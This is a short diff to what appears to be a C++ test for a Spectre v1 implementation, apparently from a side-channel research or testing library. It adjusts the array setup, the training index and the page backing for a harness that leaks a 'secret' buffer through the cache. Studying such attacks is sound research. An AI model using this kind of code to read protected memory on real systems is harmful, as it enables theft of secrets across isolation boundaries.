@@ -9,8 +9,7 @@
 
 unsigned int array1_size = 16;
 uint8_t unused[64]; // seperate by a cacheline
-uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
-uint8_t unused2[64]; // seperate by a cacheline
+uint8_t array1[160] = {1, 2, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16};
 uint8_t *array2;
 
 uint8_t secret[25] = {0xde, 0xad, 0xbe, 0xef, 0x69};
@@ -32,11 +31,16 @@ TEST_CASE("Spectrev1", "[branch]")
     Spectrev1 s(array1,
                 array2,
                 [](volatile size_t x){flush(&array1_size); get_elem(x);},
-                [](size_t _t){return _t%16;},
+                [](size_t _t){return 11;},
                 64,
                 MAX_TRIES/4,
                 20
     );
+    // Need to make sure every page of array2 is backed
+    for (auto i = 0; i < 64*MAX_BYTE; i += PAGE_SIZE)
+    {
+        array2[i] = 1;
+    }
 
     uint8_t val;
     for (size_t i = 0; i < 25; ++i)
